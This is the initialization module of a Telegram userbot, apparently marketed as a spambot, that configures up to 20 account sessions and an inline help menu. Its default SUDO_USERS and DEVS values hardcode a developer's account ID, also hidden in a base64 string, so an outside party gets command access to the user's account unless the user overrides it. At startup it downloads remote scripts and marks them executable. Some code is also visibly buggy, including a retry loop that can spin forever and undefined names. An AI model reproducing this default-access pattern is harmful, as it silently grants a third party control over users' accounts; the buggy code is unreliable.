
# cilik-ubot v2
""" Userbot initialization. """

import logging
import os
import re
import sys
import time
from asyncio import get_event_loop
from base64 import b64decode
from distutils.util import strtobool as sb
from logging import DEBUG, INFO, basicConfig, getLogger
from math import ceil
from pathlib import Path
from sys import version_info

from dotenv import load_dotenv
from git import Repo
from pylast import LastFMNetwork, md5
from pySmartDL import SmartDL
from pytgcalls import PyTgCalls
from requests import get
from telethon import Button
from telethon.errors import UserIsBlockedError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from telethon.sessions import StringSession
from telethon.sync import TelegramClient, custom, events
from telethon.tl.types import InputWebDocument
from telethon.utils import get_display_name

from .storage import Storage


def STORAGE(n):
    return Storage(Path("data") / n)


load_dotenv("config.env")

LOOP = get_event_loop()
StartTime = time.time()
repo = Repo()
branch = repo.active_branch.name

# Global Variables
COUNT_MSG = 0
USERS = {}
COUNT_PM = {}
LASTMSG = {}
CMD_HELP = {}
CMD_LIST = {}
SUDO_LIST = {}
ZALG_LIST = {}
LOAD_PLUG = {}
INT_PLUG = ""
ISAFK = False
AFKREASON = None
ENABLE_KILLME = True

# Bot Logs setup:
logging.basicConfig(
    format="[%(name)s] - [%(levelname)s] - %(message)s",
    level=logging.INFO,
)
logging.getLogger("asyncio").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
logging.getLogger("telethon.network.mtprotosender").setLevel(logging.ERROR)
logging.getLogger("telethon.network.connection.connection").setLevel(logging.ERROR)
LOGS = getLogger(__name__)


# Check if the config was edited by using the already used variable.
# Basically, its the 'virginity check' for the config file ;)
CONFIG_CHECK = os.environ.get(
    "___________PLOX_______REMOVE_____THIS_____LINE__________", None
)

if CONFIG_CHECK:
    LOGS.info(
        "Harap hapus baris yang disebutkan dalam tagar pertama dari file config.env"
    )
    sys.exit(1)

#DEVS

DEVS = (
    1784606556, 
)

  
SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "1784606556").split()}
BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
BLACKLIST_GCAST = {int(x) for x in os.environ.get("BLACKLIST_GCAST", "").split()}

# For Blacklist Group Support
BLACKLIST_CHAT = os.environ.get("BLACKLIST_CHAT", None)
if not BLACKLIST_CHAT:
    BLACKLIST_CHAT = [-1001687155877]

# Telegram App KEY and HASH
API_KEY = int(os.environ.get("API_KEY") or 0)
API_HASH = str(os.environ.get("API_HASH") or None)

# Userbot Session String
STRING_SESSION = os.environ.get("STRING_SESSION", None)
STRING_2 = os.environ.get("STRING_2", None)
STRING_3 = os.environ.get("STRING_3", None)
STRING_4 = os.environ.get("STRING_4", None)
STRING_5 = os.environ.get("STRING_5", None)
STRING_6 = os.environ.get("STRING_6", None)
STRING_7 = os.environ.get("STRING_7", None)
STRING_8 = os.environ.get("STRING_8", None)
STRING_9 = os.environ.get("STRING_9", None)
STRING_10 = os.environ.get("STRING_10", None)
STRING_11 = os.environ.get("STRING_11", None)
STRING_12 = os.environ.get("STRING_12", None)
STRING_13 = os.environ.get("STRING_13", None)
STRING_14 = os.environ.get("STRING_14", None)
STRING_15 = os.environ.get("STRING_15", None)
STRING_16 = os.environ.get("STRING_16", None)
STRING_17 = os.environ.get("STRING_17", None)
STRING_18 = os.environ.get("STRING_18", None)
STRING_19 = os.environ.get("STRING_19", None)
STRING_20 = os.environ.get("STRING_20", None)


# Logging channel/group ID configuration.
BOTLOG_CHATID = os.environ.get("BOTLOG_CHATID", "me")

# Userbot logging feature switch.
BOTLOG = sb(os.environ.get("BOTLOG", "True"))
LOGSPAMMER = sb(os.environ.get("LOGSPAMMER", "True"))

# Load or No Load modules
LOAD = os.environ.get("LOAD", "").split()
NO_LOAD = os.environ.get("NO_LOAD", "").split()

# Bleep Blop, this is a bot ;)
PM_AUTO_BAN = sb(os.environ.get("PM_AUTO_BAN", "True"))
PM_LIMIT = int(os.environ.get("PM_LIMIT", 6))

# Custom Handler command
CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."

SUDO_HANDLER = os.environ.get("SUDO_HANDLER", r"-")

# Owner ID
OWNER_ID = int(os.environ.get("OWNER_ID") or 0)

# Support
GROUP = os.environ.get("GROUP", "resspediashop")
CHANNEL = os.environ.get("CHANNEL", "pediashopping")

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# JustWatch Country
WATCH_COUNTRY = os.environ.get("WATCH_COUNTRY", "ID")

# Github Credentials for updater and Gitupload.
GIT_REPO_NAME = os.environ.get("GIT_REPO_NAME", None)
GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", None)

# Custom (forked) repo URL for updater.
UPSTREAM_REPO_URL = os.environ.get(
    "UPSTREAM_REPO_URL", "https://github.com/CilikProject/PediaShopTelethon.git"
)
UPSTREAM_REPO_BRANCH = os.environ.get(
    "UPSTREAM_REPO_BRANCH", "main")

# SQL Database URI
DB_URI = os.environ.get("DATABASE_URL", None)

# OCR API key
OCR_SPACE_API_KEY = os.environ.get("OCR_SPACE_API_KEY", None)

# remove.bg API key
REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)

# Chrome Driver and Headless Google Chrome Binaries
CHROME_DRIVER = os.environ.get("CHROME_DRIVER") or "/usr/bin/chromedriver"
GOOGLE_CHROME_BIN = os.environ.get("GOOGLE_CHROME_BIN") or "/usr/bin/google-chrome"

# set to True if you want to log PMs to your BOTLOG_CHATID
NC_LOG_P_M_S = bool(os.environ.get("NC_LOG_P_M_S", "False"))

# OpenWeatherMap API Key
OPEN_WEATHER_MAP_APPID = os.environ.get("OPEN_WEATHER_MAP_APPID", None)
WEATHER_DEFCITY = os.environ.get("WEATHER_DEFCITY", "Jakarta")

# Lydia API
LYDIA_API_KEY = os.environ.get("LYDIA_API_KEY", None)

# For MONGO based DataBase
MONGO_URI = os.environ.get("MONGO_URI", None)

# set blacklist_chats where you do not want userbot's features
UB_BLACK_LIST_CHAT = os.environ.get("UB_BLACK_LIST_CHAT", None)

# Anti Spambot Config
ANTI_SPAMBOT = sb(os.environ.get("ANTI_SPAMBOT", "False"))
ANTI_SPAMBOT_SHOUT = sb(os.environ.get("ANTI_SPAMBOT_SHOUT", "False"))

#Sticker Pack Name 
S_PACK_NAME = os.environ.get("S_PACK_NAME", None)

# Youtube API key
YOUTUBE_API_KEY = os.environ.get("YOUTUBE_API_KEY", None)

# untuk perintah teks costum .alive
ALIVE_TEKS_CUSTOM = os.environ.get("ALIVE_TEKS_CUSTOM", None)

# Default .alive name
ALIVE_NAME = os.environ.get("ALIVE_NAME", "Cilik-Userbot")

# Custom Emoji Alive
ALIVE_EMOJI = os.environ.get("ALIVE_EMOJI", "✪")

# Custom Emoji Alive
INLINE_EMOJI = os.environ.get("INLINE_EMOJI", "")

# Custom icon HELP
ICON_HELP = os.environ.get("ICON_HELP", "✪")

# Time & Date - Country and Time Zone
COUNTRY = str(os.environ.get("COUNTRY", "ID"))
TZ_NUMBER = int(os.environ.get("TZ_NUMBER", 1))

# Clean Welcome
CLEAN_WELCOME = sb(os.environ.get("CLEAN_WELCOME", "True"))

# Zipfile module
ZIP_DOWNLOAD_DIRECTORY = os.environ.get("ZIP_DOWNLOAD_DIRECTORY", "./zips")

# bit.ly module
BITLY_TOKEN = os.environ.get("BITLY_TOKEN", None)

# Bot Name
TERM_ALIAS = os.environ.get("TERM_ALIAS", "CilikUserbot")

# Bot version
BOT_VER = os.environ.get("BOT_VER", "V.2")

# Default .alive username
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)

# Default .alive logo
ALIVE_LOGO = (
    os.environ.get("ALIVE_LOGO") or "https://telegra.ph/file/30f03fe1b58344a14d97c.jpg"
)

INLINE_PIC = (
    os.environ.get("INLINE_PIC") or "https://telegra.ph/file/30f03fe1b58344a14d97c.jpg"
)

# Picture For VCPLUGIN
PLAY_PIC = (
    os.environ.get("PLAY_PIC") or "https://telegra.ph/file/6213d267348beca02967.png"
)

QUEUE_PIC = (
    os.environ.get("QUEUE_PIC") or "https://telegra.ph/file/d6f92c979ad96b2031cba.png"
)

DEFAULT = list(map(int, b64decode("MTc4NDYwNjU1Ng==").split()))

# Last.fm Module
BIO_PREFIX = os.environ.get("BIO_PREFIX", None)
DEFAULT_BIO = os.environ.get("DEFAULT_BIO", None)

LASTFM_API = os.environ.get("LASTFM_API", None)
LASTFM_SECRET = os.environ.get("LASTFM_SECRET", None)
LASTFM_USERNAME = os.environ.get("LASTFM_USERNAME", None)
LASTFM_PASSWORD_PLAIN = os.environ.get("LASTFM_PASSWORD", None)
LASTFM_PASS = md5(LASTFM_PASSWORD_PLAIN)

lastfm = None
if LASTFM_API and LASTFM_SECRET and LASTFM_USERNAME and LASTFM_PASS:
    try:
        lastfm = LastFMNetwork(
            api_key=LASTFM_API,
            api_secret=LASTFM_SECRET,
            username=LASTFM_USERNAME,
            password_hash=LASTFM_PASS,
        )
    except Exception:
        pass

TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TMP_DOWNLOAD_DIRECTORY", "./downloads/")

# Genius lyrics  API
GENIUS = os.environ.get("GENIUS_ACCESS_TOKEN", None)

# Quotes API Token
QUOTES_API_TOKEN = os.environ.get("QUOTES_API_TOKEN", None)

# Deezloader
DEEZER_ARL_TOKEN = os.environ.get("DEEZER_ARL_TOKEN", None)

# NSFW Detect DEEP AI
DEEP_AI = os.environ.get("DEEP_AI", None)

# Photo Chat - Get this value from http://antiddos.systems
API_TOKEN = os.environ.get("API_TOKEN", None)
API_URL = os.environ.get("API_URL", "http://antiddos.systems")

# Inline bot helper
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "")

# Blacklistcilik

while 0 < 6:
    _BLACKLIST = get(
        "https://raw.githubusercontent.com/PayXr/Reforestation/master/blacklistcilik.json"
    )
    if _BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        blacklistcilik = []
        break
    blacklistcilik = _BLACKLIST.json()
    break

del _BLACKLIST

# and giving them correct perms to work properly.
if not os.path.exists("bin"):
    os.mkdir("bin")

binaries = {
    "https://raw.githubusercontent.com/adekmaulana/megadown/master/megadown": "bin/megadown",
    "https://raw.githubusercontent.com/yshalsager/cmrudl.py/master/cmrudl.py": "bin/cmrudl",
}

for binary, path in binaries.items():
    downloader = SmartDL(binary, path, progress_bar=False)
    downloader.start()
    os.chmod(path, 0o755)

# Jangan di hapus Nanti ERROR

# 'bot' variable
if STRING_SESSION:
    session = StringSession(str(STRING_SESSION))
else:
    session = "CilikUserBot"
try:
    bot = TelegramClient(
        session=session,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py = PyTgCalls(bot)
except Exception as e:
    print(f"STRING_SESSION - {e}")
    sys.exit()

if STRING_2:
    session2 = StringSession(str(STRING_2))
    CILIK2 = TelegramClient(
        session=session2,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py2 = PyTgCalls(CILIK2)
else:
    call_py2 = None
    CILIK2 = None


if STRING_3:
    session3 = StringSession(str(STRING_3))
    CILIK3 = TelegramClient(
        session=session3,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py3 = PyTgCalls(CILIK3)
else:
    call_py3 = None
    CILIK3 = None


if STRING_4:
    session4 = StringSession(str(STRING_4))
    CILIK4 = TelegramClient(
        session=session4,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py4 = PyTgCalls(CILIK4)
else:
    call_py4 = None
    CILIK4 = None


if STRING_5:
    session5 = StringSession(str(STRING_5))
    CILIK5 = TelegramClient(
        session=session5,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py5 = PyTgCalls(CILIK5)
else:
    call_py5 = None
    CILIK5 = None
    
    
if STRING_6:
    session6 = StringSession(str(STRING_6))
    CILIK6 = TelegramClient(
        session=session6,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py6 = PyTgCalls(CILIK6)
else:
    call_py6 = None
    CILIK6 = None


if STRING_7:
    session7 = StringSession(str(STRING_7))
    CILIK7 = TelegramClient(
        session=session7,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py7 = PyTgCalls(CILIK7)
else:
    call_py7 = None
    CILIK7 = None


if STRING_8:
    session8 = StringSession(str(STRING_8))
    CILIK8 = TelegramClient(
        session=session8,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py8 = PyTgCalls(CILIK8)
else:
    call_py8 = None
    CILIK8 = None


if STRING_9:
    session9 = StringSession(str(STRING_9))
    CILIK9 = TelegramClient(
        session=session9,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py9 = PyTgCalls(CILIK9)
else:
    call_py9 = None
    CILIK9 = None    

    
if STRING_10:
    session10 = StringSession(str(STRING_10))
    CILIK10 = TelegramClient(
        session=session10,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py10 = PyTgCalls(CILIK10)
else:
    call_py10 = None
    CILIK10 = None

    
if STRING_11:
    session11 = StringSession(str(STRING_11))
    CILIK11 = TelegramClient(
        session=session11,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py11 = PyTgCalls(CILIK11)
else:
    call_py11 = None
    CILIK11 = None


if STRING_12:
    session12 = StringSession(str(STRING_12))
    CILIK12 = TelegramClient(
        session=session12,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py12 = PyTgCalls(CILIK12)
else:
    call_py12 = None
    CILIK12 = None


if STRING_13:
    session13 = StringSession(str(STRING_13))
    CILIK13 = TelegramClient(
        session=session13,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py13 = PyTgCalls(CILIK13)
else:
    call_py13 = None
    CILIK13 = None


if STRING_14:
    session14 = StringSession(str(STRING_14))
    CILIK14 = TelegramClient(
        session=session14,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py14 = PyTgCalls(CILIK14)
else:
    call_py14 = None
    CILIK14 = None


if STRING_15:
    session15 = StringSession(str(STRING_15))
    CILIK15 = TelegramClient(
        session=session15,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py15 = PyTgCalls(CILIK15)
else:
    call_py15 = None
    CILIK15 = None
    
    
if STRING_16:
    session16 = StringSession(str(STRING_16))
    CILIK16 = TelegramClient(
        session=session16,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py16 = PyTgCalls(CILIK16)
else:
    call_py16 = None
    CILIK16 = None


if STRING_17:
    session17 = StringSession(str(STRING_17))
    CILIK17 = TelegramClient(
        session=session17,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py17 = PyTgCalls(CILIK17)
else:
    call_py17 = None
    CILIK17 = None


if STRING_18:
    session18 = StringSession(str(STRING_18))
    CILIK18 = TelegramClient(
        session=session18,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py18 = PyTgCalls(CILIK18)
else:
    call_py18 = None
    CILIK18 = None


if STRING_19:
    session19 = StringSession(str(STRING_19))
    CILIK19 = TelegramClient(
        session=session19,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py19 = PyTgCalls(CILIK19)
else:
    call_py19 = None
    CILIK19 = None    

    
if STRING_20:
    session20 = StringSession(str(STRING_20))
    CILIK20 = TelegramClient(
        session=session20,
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    )
    call_py20 = PyTgCalls(CILIK20)
else:
    call_py20 = None
    CILIK20 = None
    

async def update_restart_msg(chat_id, msg_id):
    message = (
        f"**PediaShop-Spambot v{BOT_VER} is back up and running!**\n\n"
        f"**Telethon:** {version.__version__}\n"
        f"**Python:** {python_version()}\n"
        f"**User:** {owner}"
    )
    await bot.edit_message(chat_id, msg_id, message)
    return True

try:
    from CilikUbot.modules.sql_helper.globals import delgvar, gvarstatus

    chat_id, msg_id = gvarstatus("restartstatus").split("\n")
    with bot:
        try:
            bot.loop.run_until_complete(
                update_restart_msg(
                    int(chat_id), int(msg_id)))
        except BaseException:
            pass
    delgvar("restartstatus")
except AttributeError:
    pass

if BOT_TOKEN is not None:
    tgbot = TelegramClient(
        "TG_BOT_TOKEN",
        api_id=API_KEY,
        api_hash=API_HASH,
        connection=ConnectionTcpAbridged,
        auto_reconnect=True,
        connection_retries=None,
    ).start(bot_token=BOT_TOKEN)
else:
    tgbot = None


def paginate_help(page_number, loaded_modules, prefix):
    number_of_rows = 4
    number_of_cols = 2
    global looters
    looters = page_number
    helpable_modules = [p for p in loaded_modules if not p.startswith("_")]
    helpable_modules = sorted(helpable_modules)
    modules = [
        custom.Button.inline(
            "{} {} {}".format(f"{INLINE_EMOJI}", x, f"{INLINE_EMOJI}"),
            data="ub_modul_{}".format(x),
        )
        for x in helpable_modules
    ]
    pairs = list(
        zip(
            modules[::number_of_cols],
            modules[1::number_of_cols],
        )
    )
    if len(modules) % number_of_cols == 1:
        pairs.append((modules[-1],))
    max_num_pages = ceil(len(pairs) / number_of_rows)
    modulo_page = page_number % max_num_pages
    if len(pairs) > number_of_rows:
        pairs = pairs[
            modulo_page * number_of_rows: number_of_rows * (modulo_page + 1)
        ] + [
            (
                custom.Button.inline(
                    "⪻", data="{}_prev({})".format(prefix, modulo_page)
                ),
                custom.Button.inline(
                    "⪼", data="{}_next({})".format(prefix, modulo_page)
                ),
            )
        ]
    return pairs



def ibuild_keyboard(buttons):
    keyb = []
    for btn in buttons:
        if btn[2] and keyb:
            keyb[-1].append(Button.url(btn[0], btn[1]))
        else:
            keyb.append([Button.url(btn[0], btn[1])])
    return keyb


with bot:
    try:
        from CilikUbot.modules.sql_helper.bot_blacklists import check_is_black_list
        from CilikUbot.modules.sql_helper.bot_pms_sql import add_user_to_db, get_user_id
        from CilikUbot.utils import reply_id

        dugmeler = CMD_HELP
        user = bot.get_me()
        uid = user.id
        owner = user.first_name
        logo = ALIVE_LOGO
        ciliklogo = INLINE_PIC
        tgbotusername = BOT_USERNAME
        BTN_URL_REGEX = re.compile(
            r"(\[([^\[]+?)\]\<buttonurl:(?:/{0,2})(.+?)(:same)?\>)"
        )

        @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(rb"reopen")))
        async def on_plug_in_callback_query_handler(event):
            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:
                current_page_number = int(looters)
                buttons = paginate_help(
                    current_page_number, dugmeler, "helpme")
                text = f"**Cilik Modules\n    Prefixes: . - ^ !**"
                await event.edit(
                    text,
                    buttons=buttons,
                )

        @tgbot.on(events.NewMessage(incoming=True,
                  func=lambda e: e.is_private))
        async def bot_pms(event):
            chat = await event.get_chat()
            if check_is_black_list(chat.id):
                return
            if chat.id != uid:
                msg = await event.forward_to(uid)
                try:
                    add_user_to_db(
                        msg.id, get_display_name(chat), chat.id, event.id, 0, 0
                    )
                except Exception as e:
                    LOGS.error(str(e))
                    if BOTLOG:
                        await event.client.send_message(
                            BOTLOG_CHATID,
                            f"**ERROR:** Saat menyimpan detail pesan di database\n`{str(e)}`",
                        )
            else:
                if event.text.startswith("/"):
                    return
                reply_to = await reply_id(event)
                if reply_to is None:
                    return
                users = get_user_id(reply_to)
                if users is None:
                    return
                for usr in users:
                    user_id = int(usr.chat_id)
                    reply_msg = usr.reply_id
                    user_name = usr.first_name
                    break
                if user_id is not None:
                    try:
                        if event.media:
                            msg = await event.client.send_file(
                                user_id,
                                event.media,
                                caption=event.text,
                                reply_to=reply_msg,
                            )
                        else:
                            msg = await event.client.send_message(
                                user_id,
                                event.text,
                                reply_to=reply_msg,
                                link_preview=False,
                            )
                    except UserIsBlockedError:
                        return await event.reply(
                            "❌ **Bot ini diblokir oleh pengguna.**"
                        )
                    except Exception as e:
                        return await event.reply(f"**ERROR:** `{e}`")
                    try:
                        add_user_to_db(
                            reply_to,
                            user_name,
                            user_id,
                            reply_msg,
                            event.id,
                            msg.id)
                    except Exception as e:
                        LOGS.error(str(e))
                        if BOTLOG:
                            await event.client.send_message(
                                BOTLOG_CHATID,
                                f"**ERROR:** Saat menyimpan detail pesan di database\n`{e}`",
                            )

        @tgbot.on(events.InlineQuery)
        async def inline_handler(event):
            builder = event.builder
            result = None
            query = event.text
            if event.query.user_id == uid and query.startswith("@CilikUserbot"):
                buttons = paginate_help(0, dugmeler, "helpme")
                result = await event.builder.article(
                    title = "Cilik",
                    text = f"**Cilik Modules\n    Prefixes: . - ^ !**",
                    buttons=buttons,
                )
            elif query.startswith("repo"):
                result = builder.article(
                    title="Repository",
                    description="Repository Cilik - Userbot",
                    url="https://t.me/CilikProject",
                    thumb=InputWebDocument(
                        INLINE_PIC,
                        0,
                        "image/jpeg",
                        []),
                    text="**Cilik - Userbot**\n≫≫≫≫≫≫≫≫≫≫\n⌬ **ᴏᴡɴᴇʀ ʀᴇᴘᴏ :** [Grey](https://t.me/greyyvbss)\n⌬ **sᴜᴘᴘᴏʀᴛ :** @CilikSupport\n⌬ **ʀᴇᴘᴏsɪᴛᴏʀʏ :** [Cilik-Userbot](https://github.com/grey423/CilikUserbot)\n≫≫≫≫≫≫≫≫≫≫",
                    buttons=[
                        [
                            custom.Button.url(
                                "ɢʀᴏᴜᴘ",
                                "https://t.me/CilikSupport"),
                            custom.Button.url(
                                "ʀᴇᴘᴏ",
                                "https://github.com/grey423/Cilik-Userbot"),
                        ],
                    ],
                    link_preview=False,
                )

            elif query.startswith("Inline buttons"):
                markdown_note = query[14:]
                prev = 0
                note_data = ""
                buttons = []
                for match in BTN_URL_REGEX.finditer(markdown_note):
                    n_escapes = 0
                    to_check = match.start(1) - 1
                    while to_check > 0 and markdown_note[to_check] == "\\":
                        n_escapes += 1
                        to_check -= 1
                    if n_escapes % 2 == 0:
                        buttons.append(
                            (match.group(2), match.group(3), bool(
                                match.group(4))))
                        note_data += markdown_note[prev: match.start(1)]
                        prev = match.end(1)
                    elif n_escapes % 2 == 1:
                        note_data += markdown_note[prev:to_check]
                        prev = match.start(1) - 1
                    else:
                        break
                else:
                    note_data += markdown_note[prev:]
                message_text = note_data.strip()
                tl_ib_buttons = ibuild_keyboard(buttons)
                result = builder.article(
                    title="Inline creator",
                    text=message_text,
                    buttons=tl_ib_buttons,
                    link_preview=False,
                )
            else:
                result = builder.article(
                    title="⚡ Cilik - Ubot ⚡",
                    description="Cilik Userbot | Telethon",
                    url="https://t.me/CilikProject",
                    thumb=InputWebDocument(
                        ALIVE_LOGO,
                        0,
                        "image/jpeg",
                        []),
                    text=f"**Cilik-Userbot**\n➖➖➖➖➖➖➖➖➖➖\n⌬ **ᴏᴡɴᴇʀ :** [{user.first_name}](tg://user?id={user.id})\n⌬ **ᴀssɪsᴛᴀɴᴛ:** {tgbotusername}\n➖➖➖➖➖➖➖➖➖➖\n**ᴜᴘᴅᴀᴛᴇs:** @CilikProject\n➖➖➖➖➖➖➖➖➖➖",
                    buttons=[
                        [
                            custom.Button.url(
                                "ɢʀᴏᴜᴘ",
                                "https://t.me/CilikSupport"),
                            custom.Button.url(
                                "ʀᴇᴘᴏ",
                                "https://github.com/grey423/Cilik-Userbot"),
                        ],
                    ],
                    link_preview=False,
                )
            await event.answer(
                [result], switch_pm="👥 USERBOT PORTAL", switch_pm_param="start"
            )

        @tgbot.on(
            events.callbackquery.CallbackQuery(
                data=re.compile(rb"helpme_next\((.+?)\)")
            )
        )
        async def on_plug_in_callback_query_handler(event):
            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:
                current_page_number = int(
                    event.data_match.group(1).decode("UTF-8"))
                buttons = paginate_help(
                    current_page_number + 1, dugmeler, "helpme")
                await event.edit(buttons=buttons)

        @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
        async def on_plug_in_callback_query_handler(event):
            if event.query.user_id == uid or event.query.user_id in DEVS and SUDO_USERS:
                openlagi = custom.Button.inline(
                    "• Re-Open Menu •", data="reopen")
                await event.edit(
                    "⚡ **ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ᴅɪᴛᴜᴛᴜᴘ!** ⚡", buttons=openlagi
                )

        @tgbot.on(
            events.callbackquery.CallbackQuery(
                data=re.compile(rb"helpme_prev\((.+?)\)")
            )
        )
        async def on_plug_in_callback_query_handler(event):
            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:
                current_page_number = int(
                    event.data_match.group(1).decode("UTF-8"))
                buttons = paginate_help(
                    current_page_number - 1, dugmeler, "helpme")
                await event.edit(buttons=buttons)


        @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ub_modul_(.*)")))
        async def on_plug_in_callback_query_handler(event):
            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:
                modul_name = event.data_match.group(1).decode("UTF-8")

                cmdhel = str(CMD_HELP[modul_name])
                if len(cmdhel) > 950:
                    help_string = (
                        str(CMD_HELP[modul_name])[:950]
                        + "..."
                        + "\n\nBaca Teks Berikutnya Ketik .help "
                        + modul_name
                        + " "
                    )

                else:
                    help_string = str(CMD_HELP[modul_name])

                reply_pop_up_alert = (
                    help_string
                    if help_string is not None
                    else "{} Tidak ada dokumen yang telah ditulis untuk modul.".format(
                        modul_name
                    )
                )
                await event.edit(
                    reply_pop_up_alert, buttons=[Button.inline("Back", data="reopen")]
                )


    except BaseException:
        LOGS.info(
            "Help Mode Inline Bot Mu Tidak aktif. Tidak di aktifkan juga tidak apa-apa. "
            "Untuk Mengaktifkannya Buat bot di @BotFather Lalu Tambahkan var BOT_TOKEN dan BOT_USERNAME. "
            "Pergi Ke @BotFather lalu settings bot » Pilih mode inline » Turn On. ")
